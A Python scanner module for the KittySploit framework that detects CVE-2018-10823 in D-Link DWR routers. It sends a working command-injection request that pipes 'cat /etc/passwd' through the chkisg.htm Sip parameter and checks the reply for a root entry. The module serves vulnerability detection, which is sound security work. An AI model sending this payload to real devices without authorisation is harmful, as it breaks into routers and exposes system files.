#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DWR-116 through 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link Routers - Remote Command Injection Detection',
        'description': 'D-Link DWR-116 through 1.06, DWR-512 through 2.02, DWR-712 through 2.02, DWR-912 through 2.02, DWR-921 through 2.02, and DWR-111 through 1.01 device may allow an authenticated attacker to execute arbitrary code by injecting the shell command into the chkisg.htm page Sip parameter. This allows for full control over the device internals.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'rce', 'iot', 'dlink', 'router', 'edb', 'seclists', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/45676',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-10823',
            'https://seclists.org/fulldisclosure/2018/Oct/36',
            'http://sploit.tech/2018/10/12/D-Link.html',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-10823',
    }

    def run(self):
        r = self.http_request(method="GET", path='/chkisg.htm%3FSip%3D1.1.1.1%20%7C%20cat%20%2Fetc%2Fpasswd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="D-Link Routers - Remote Command Injection detected",
                path='/chkisg.htm%3FSip%3D1.1.1.1%20%7C%20cat%20%2Fetc%2Fpasswd',
            )
            return True
        return False

